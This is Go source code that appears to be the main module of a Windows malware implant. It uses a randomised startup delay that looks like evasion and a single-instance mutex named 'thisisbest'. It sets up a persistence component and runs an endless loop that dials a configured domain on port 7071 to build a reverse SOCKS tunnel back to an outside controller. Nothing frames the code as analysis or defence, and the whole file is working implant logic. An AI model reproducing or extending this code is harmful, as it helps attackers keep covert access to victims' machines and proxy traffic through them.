package main

import (
	crand "crypto/rand"
	"fmt"
	"math"
	"math/big"
	"math/rand"
	"net"
	"syscall"
	"time"
	"unsafe"
)

func main() {
	seed, _ := crand.Int(crand.Reader, big.NewInt(math.MaxInt64))
	rand.Seed(seed.Int64())
	time.Sleep(time.Second * time.Duration(rand.Intn(10) + 20))
	if _, err := CreateMutex("thisisbest"); err != nil {
		return
	}
	var config Config
	var persistence Persistence

	err := config.Init()
	if err != nil {
		return
	}
	err = persistence.Init(config)
	if err != nil {
		return
	}
	for {
		err = mainFunc(config)
		if err != nil {
			fmt.Println(err)
		}
		time.Sleep(time.Second * 10)
	}
}

func CreateMutex(name string) (uintptr, error) {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	procCreateMutex := kernel32.NewProc("CreateMutexW")
	ret, _, err := procCreateMutex.Call(
		0,
		0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(name))),
	)
	switch int(err.(syscall.Errno)) {
	case 0:
		return ret, nil
	default:
		return ret, err
	}
}

func ReverseSocks(tag string, config Config, ch chan bool) {
	exit := false
	go func() {
		exit = <- ch
	}()
	for {
		if exit {
			return
		}
		conn, err := net.Dial("tcp", fmt.Sprintf("%s:7071", config.domain))
		if err != nil {
			time.Sleep(time.Second)
			continue
		}
		ConnectForSocks(conn, tag, ch)
	}
}

func mainFunc(config Config) error {
	tag := RandomString(16)
	ch := make(chan bool)
	go ReverseSocks(tag, config, ch)
	var handler Handler
	err := handler.Init(config, tag)
	ch <- true
	return err
}
